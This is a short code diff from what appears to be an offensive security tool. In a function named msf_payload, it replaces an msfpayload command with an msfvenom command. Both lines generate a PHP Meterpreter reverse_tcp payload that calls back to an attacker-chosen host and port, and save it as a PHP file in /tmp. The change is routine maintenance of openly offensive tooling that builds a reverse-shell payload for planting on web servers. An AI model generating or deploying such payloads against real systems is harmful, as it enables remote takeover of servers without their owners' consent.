@@ -64,7 +64,7 @@ def msf_payload():
 
     """ MSF payload generation """
 
-    php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(
+    php = "/usr/bin/msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f raw > /tmp/{2}.php".format(
         lhost, lport, shell)
 
     try:
